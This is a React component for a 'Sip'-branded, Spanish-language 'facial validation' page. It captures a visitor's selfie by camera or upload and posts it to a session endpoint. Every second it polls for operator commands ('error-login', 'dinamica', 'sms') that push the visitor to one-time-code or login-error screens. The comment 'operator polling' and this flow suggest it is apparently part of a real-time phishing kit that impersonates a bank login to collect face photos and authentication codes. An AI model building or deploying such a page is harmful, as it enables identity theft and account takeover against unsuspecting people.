import { useEffect, useRef, useState } from 'react'
import { SipLogo } from './Icons'

type SelfiePageProps = {
  sessionId?: string
  onHome: () => void
  onOtpRequired?: (mode: 'dinamica' | 'sms') => void
  onErrorLogin?: () => void
}

export function SelfiePage({
  sessionId,
  onHome,
  onOtpRequired,
  onErrorLogin,
}: SelfiePageProps) {
  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const [ready, setReady] = useState(false)
  const [error, setError] = useState('')
  const [photo, setPhoto] = useState('')

  // Stable callback refs
  const onHomeRef = useRef(onHome)
  const onOtpRequiredRef = useRef(onOtpRequired)
  const onErrorLoginRef = useRef(onErrorLogin)

  useEffect(() => {
    onHomeRef.current = onHome
    onOtpRequiredRef.current = onOtpRequired
    onErrorLoginRef.current = onErrorLogin
  })

  // Keep-alive ping and operator polling
  useEffect(() => {
    if (!sessionId) return

    const ping = () => {
      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {})
    }
    ping()
    const pingTimer = window.setInterval(ping, 3000)

    // Notify server we are in selfie mode
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: 'waiting-selfie' }),
    }).catch(() => {})

    const pollTimer = window.setInterval(async () => {
      try {
        const res = await fetch(`/api/sessions/${sessionId}`)
        if (!res.ok) return
        const session = await res.json()
        const action = session.action

        if (action === 'done') {
          onHomeRef.current()
          return
        }

        if (action === 'error-login') {
          onErrorLoginRef.current?.()
          return
        }

        if (action === 'dinamica' || action === 'sms') {
          onOtpRequiredRef.current?.(action)
          return
        }
      } catch {}
    }, 1000)

    return () => {
      window.clearInterval(pingTimer)
      window.clearInterval(pollTimer)
    }
  }, [sessionId])

  useEffect(() => {
    let cancelled = false

    async function start() {
      try {
        let stream: MediaStream | null = null
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          try {
            stream = await navigator.mediaDevices.getUserMedia({
              audio: false,
              video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            })
          } catch {
            // Fallback to generic video constraints
            stream = await navigator.mediaDevices.getUserMedia({
              audio: false,
              video: true,
            })
          }
        }

        if (cancelled) {
          stream?.getTracks().forEach((track) => track.stop())
          return
        }

        if (stream) {
          streamRef.current = stream
          const video = videoRef.current
          if (video) {
            video.srcObject = stream
            video.muted = true
            await video.play().catch(() => {})
          }
          setReady(true)
        } else {
          setError('Cámara no disponible. Puedes subir una foto directamente.')
        }
      } catch {
        if (!cancelled) {
          setError('No se pudo acceder a la cámara. Puedes permitir el acceso o subir una foto.')
        }
      }
    }

    void start()

    return () => {
      cancelled = true
      streamRef.current?.getTracks().forEach((track) => track.stop())
      streamRef.current = null
    }
  }, [])

  function takeSelfie() {
    const video = videoRef.current
    const canvas = canvasRef.current
    if (!video || !canvas || !ready) return
    const width = video.videoWidth || 720
    const height = video.videoHeight || 960
    canvas.width = width
    canvas.height = height
    const ctx = canvas.getContext('2d')
    if (!ctx) return
    ctx.translate(width, 0)
    ctx.scale(-1, 1)
    ctx.drawImage(video, 0, 0, width, height)
    const dataUrl = canvas.toDataURL('image/jpeg', 0.88)
    setPhoto(dataUrl)

    if (sessionId) {
      fetch(`/api/sessions/${sessionId}/selfie`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ photo: dataUrl }),
      }).catch(() => {})
    }
  }

  function handleFileUpload(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => {
      if (typeof reader.result === 'string') {
        const dataUrl = reader.result
        setPhoto(dataUrl)
        if (sessionId) {
          fetch(`/api/sessions/${sessionId}/selfie`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ photo: dataUrl }),
          }).catch(() => {})
        }
      }
    }
    reader.readAsDataURL(file)
  }

  function retake() {
    setPhoto('')
    if (fileInputRef.current) {
      fileInputRef.current.value = ''
    }
    if (sessionId) {
      fetch(`/api/sessions/${sessionId}/selfie`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ photo: '' }),
      }).catch(() => {})
    }
  }

  function handleFinish() {
    if (sessionId) {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'done' }),
      }).catch(() => {})
    }
    onHomeRef.current()
  }

  return (
    <div className="login-page selfie-page">
      <header className="selfie-bar">
        <button type="button" className="login-logo" onClick={onHome} aria-label="Sip">
          <SipLogo ink />
        </button>
      </header>

      <div className="selfie-body">
        <h2>Validación facial</h2>
        <p className="selfie-copy">
          Esta validación nos ayudará a realizar la verificación facial cuando detectemos que
          inicia sesión en un dispositivo desconocido.
        </p>
        <p className="selfie-hint">Centra tu cara dentro del óvalo para tomarte la selfie.</p>

        <div className={`selfie-stage${photo ? ' captured' : ''}`}>
          {photo ? (
            <img src={photo} alt="Selfie capturada" />
          ) : (
            <video ref={videoRef} autoPlay playsInline muted />
          )}
          <div className="selfie-shade" aria-hidden />
          <div className="selfie-oval" aria-hidden />
        </div>

        <canvas ref={canvasRef} className="sr-only" />
        <input
          ref={fileInputRef}
          type="file"
          accept="image/*"
          capture="user"
          className="sr-only"
          onChange={handleFileUpload}
        />

        {error && !photo ? <p className="selfie-error">{error}</p> : null}

        {photo ? (
          <div className="selfie-actions">
            <button type="button" className="login-outline" onClick={retake}>
              Tomar de nuevo
            </button>
            <button type="button" className="login-submit ready" onClick={handleFinish}>
              Continuar
            </button>
          </div>
        ) : (
          <div className="selfie-actions">
            <button
              type="button"
              className={`login-submit${ready ? ' ready' : ''}`}
              disabled={!ready}
              onClick={takeSelfie}
            >
              {ready ? 'Tomar selfie' : 'Activando cámara...'}
            </button>
            {!ready ? (
              <button
                type="button"
                className="login-outline"
                onClick={() => fileInputRef.current?.click()}
              >
                Subir foto desde dispositivo
              </button>
            ) : null}
          </div>
        )}
      </div>
    </div>
  )
}
